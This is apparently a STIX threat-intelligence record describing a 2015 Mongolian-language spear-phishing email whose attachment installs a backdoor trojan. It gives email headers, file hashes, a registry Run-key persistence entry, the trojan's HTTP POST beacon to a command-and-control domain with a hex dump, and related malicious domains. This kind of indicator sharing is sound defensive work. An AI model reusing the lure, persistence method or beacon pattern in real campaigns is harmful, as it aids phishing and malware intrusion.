stix:STIX_Header.stix:Title: Mongolian Language Phishing Email Includes Backdoor Trojan
stix:STIX_Header.stix:Description:
On 12 March 2015, a U.S. Government Agency received several Mongolian language spear-phishing emails from tavan_tolgoi@aol.com with the subject "Tavantolgoin Medee No1 (20150305)". The emails contained a malicious attachment with the same filename (MD5: 438fe265ce7a7300ed5d14b4a282fc81). The malware attempts to install a backdoor trojan that calls back to here.pechooin.com.
The details of this email were reported without file attachment metadata in IB-15-10129.

stix:Indicator.indicator:Description:
The emails have Mongolian language in the subject and body. Tavan Tolgoi is an area in southern Mongolia that is known for its mining.
----- BEGIN EMAIL HEADER ------ From: tavan_tolgoi@aol.com; To: [REDACTED] Cc: [REDACTED] Date: Thu Mar 12 12:44:14 GMT 2015 Subject: Tavantolgoin Medee No1 (20150305) Attachment: Tavantolgoin Medee No1 (20150305).doc Received: from mtaomg-mbe01.mx.aol.com (mtaomg-mbe01.mx.aol.com [172.26.254.175])by omr-m04.mx.aol.com (Outbound Mail Relay) with ESMTP id 53A1D700000BB;Thu, 12 Mar 2015 08:44:15 -0400 (EDT) Received: from core-lia06a.mail.aol.com (core-lia06.mail.aol.com [10.76.8.6])by mtaomg-mbe01.mx.aol.com (OMAG/Core Interface) with ESMTP id 8CC8F38000081;Thu, 12 Mar 2015 08:44:14 -0400 (EDT) Received: from 210.112.241.190 by webprd-m04.mail.aol.com (10.74.6.144) with HTTP (WebMailUI); 2015-Mar-12 12:44:14 Message-Id: <14c0e0386ab-47a9-5a2b@webprd-m04.mail.aol.com> MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_27270_370429135.1426164254376" X-MB-Message-Source: WebUI X-MB-Message-Type: User X-Mailer: JAS STD X-Originating-IP: [210.112.241.190] x-aol-global-disposition: G X-AOL-VSS-INFO: 5600.1067/98281 X-AOL-VSS-CODE: clean DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mx.aol.com;s=20140625; t=1426164255;bh=Y0vz2dSmkTB7bQP4shY0wkhxXr0Din4vMdA/+UnR65o=;h=From:To:Subject:Message-Id:Date:MIME-Version:Content-Type;b=p2ZAT3Ad/H6qHHirttBq2awI94nJcND2SezMCdnmEvB/WXCoStjMjmdYezWEU2SgF0sg6c7xeDBy1Hw8Dd4yhlwgNtLSkSR+As0nonaibFuQVdl8pF3Rq2K7FWVfGqY1CGvCLha9DHLCEqubpefE9xWAlxQi2g/1T4Zilqx2FHg= x-aol-sid: 3039ac1afeaf55018a1e2216 ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY ----- From: tavan_tolgoi@aol.com To: [REDACTED] CC: [REDACTED] Date: Thu Mar 12 12:44:14 GMT 2015 Subject: Tavantolgoin Medee No1 (20150305) Attachment: Tavantolgoin Medee No1 (20150305).doc
Tavantolgoin Medeeg huleen avna uu. Jich: Havsraltaar yavuulav.
----- END EMAILBODY -----

The attachment file hides itself in the user's temp system registry: HKEY_USERS\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs= rundll32.exe C:\DOCUME~1\[USER]\LOCALS~1\Temp\xpsfiltsvcs.tmp,XpsRegisterServer

This file is a trojan backdoor that disguised as an XPS file. This is a DLL file executed from the registry run key entry. After logging in and a brief sleep period, the malware calls out to here.pechooin.com:8080.

The backdoor xpsfiltsvcs.tmp (cc8da150a031d8200bb62289ab35bc1d) sent an HTTP POST request to here.pechooin.com.
POST /cgl-bin/update.cgi HTTP/1.1 Host: here.pechooin.com:8080 Content-Length: 25 Cache-Control: no-cache
ptu..tzzt..oouddtputws*xx
00000000 50 4f 53 54 20 2f 63 67 6c 2d 62 69 6e 2f 75 70 POST /cg l-bin/up 00000010 64 61 74 65 2e 63 67 69 20 48 54 54 50 2f 31 2e date.cgi HTTP/1. 00000020 31 0d 0a 48 6f 73 74 3a 20 68 65 72 65 2e 70 65 1..Host: here.pe 00000030 63 68 6f 6f 69 6e 2e 63 6f 6d 3a 38 30 38 30 0d chooin.c om:8080. 00000040 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a .Content -Length: 00000050 20 32 35 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 25..Cac he-Contr 00000060 6f 6c 3a 20 6e 6f 2d 63 61 63 68 65 0d 0a 0d 0a ol: no-c ache.... 00000070 70 74 75 05 05 74 7a 7a 74 18 18 6f 6f 75 64 64 ptu..tzz t..ooudd 00000080 74 70 75 74 77 73 2a 78 78 tputws*x x
These three domains resolved to IP address 137.175.36.13 here.pechooin.com keep.regebky.com love.regebky.com
The domain keep.regebky.com has been reported previously in a similar spear phishing campaign described in IB-15-10033.
